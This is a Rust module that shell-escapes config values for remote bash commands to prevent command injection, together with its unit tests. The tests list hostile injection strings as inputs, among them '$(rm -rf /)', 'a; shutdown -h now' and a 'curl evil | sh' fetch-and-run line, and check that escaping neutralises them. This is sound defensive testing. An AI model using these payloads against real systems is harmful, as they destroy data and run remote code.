//! Shell-escaping (R55, Fixed Contract).
//!
//! Every config-derived value interpolated into remote bash passes through
//! [`shell_escape`]. The strategy is a single-quote wrap with the classic
//! `'\''` escape for embedded single quotes. This is the primary injection
//! defense; trusted compile-time literals are the only values allowed to skip
//! it.

/// Wrap an arbitrary string as a single bash word that expands to exactly the
/// input bytes, immune to word-splitting, globbing, and interpolation.
///
/// ```text
/// foo        -> 'foo'
/// it's       -> 'it'\''s'
/// $(rm -rf)  -> '$(rm -rf)'
/// ```
pub fn shell_escape(value: &str) -> String {
    let mut out = String::with_capacity(value.len() + 2);
    out.push('\'');
    for ch in value.chars() {
        if ch == '\'' {
            // Close quote, emit an escaped quote, reopen quote.
            out.push_str("'\\''");
        } else {
            out.push(ch);
        }
    }
    out.push('\'');
    out
}

/// Escape and join several values with spaces (e.g. an `AllowUsers` list).
pub fn shell_escape_join<I, S>(values: I) -> String
where
    I: IntoIterator<Item = S>,
    S: AsRef<str>,
{
    values
        .into_iter()
        .map(|v| shell_escape(v.as_ref()))
        .collect::<Vec<_>>()
        .join(" ")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn plain_word_is_quoted() {
        assert_eq!(shell_escape("foo"), "'foo'");
    }

    #[test]
    fn single_quote_is_escaped() {
        assert_eq!(shell_escape("it's"), "'it'\\''s'");
    }

    #[test]
    fn adversarial_inputs_are_neutralized() {
        for evil in [
            "$(rm -rf /)",
            "`reboot`",
            "a; shutdown -h now",
            "x' && curl evil | sh #",
            "spaces and $VARS",
            "back\\slash",
        ] {
            let escaped = shell_escape(evil);
            // Must begin and end with a single quote and contain the payload
            // only inside quoting.
            assert!(escaped.starts_with('\''));
            assert!(escaped.ends_with('\''));
            // Round-trip: stripping the wrapper quotes and undoing the '\''
            // dance must reproduce the original bytes exactly.
            assert_eq!(unescape_for_test(&escaped), evil);
        }
    }

    #[test]
    fn empty_string_escapes_to_empty_quotes() {
        assert_eq!(shell_escape(""), "''");
    }

    #[test]
    fn join_escapes_each_value_and_tolerates_empty() {
        assert_eq!(shell_escape_join(["a b", "c'd"]), "'a b' 'c'\\''d'");
        assert_eq!(shell_escape_join(Vec::<String>::new()), "");
    }

    #[test]
    fn real_bash_round_trips_escaped_values() {
        // The unescaper below shares its author's assumptions with the
        // escaper; a real shell is the authoritative oracle. bash must expand
        // every escaped word back to exactly the input bytes.
        for evil in [
            "",
            "it's",
            "'leading and trailing'",
            "$(rm -rf /)",
            "`reboot`",
            "a; shutdown -h now",
            "x' && curl evil | sh #",
            "spaces and $VARS",
            "back\\slash",
            "new\nline",
            "tab\ttab",
            "*?[glob]",
        ] {
            let out = std::process::Command::new("bash")
                .arg("-c")
                .arg(format!("printf '%s' {}", shell_escape(evil)))
                .output();
            let Ok(out) = out else {
                eprintln!("skipping: bash not available");
                return;
            };
            assert!(out.status.success(), "bash failed for {evil:?}");
            assert_eq!(
                out.stdout,
                evil.as_bytes(),
                "round-trip through real bash failed for {evil:?}"
            );
        }
    }

    /// Reverse [`shell_escape`] the way a POSIX shell would, for round-trip
    /// assertions only.
    fn unescape_for_test(s: &str) -> String {
        // Replace the escape sequence with a sentinel, strip wrapper quotes,
        // then restore.
        let inner = s.replace("'\\''", "\u{0}");
        let trimmed = inner
            .strip_prefix('\'')
            .and_then(|x| x.strip_suffix('\''))
            .unwrap_or(&inner);
        trimmed.replace('\u{0}', "'")
    }
}
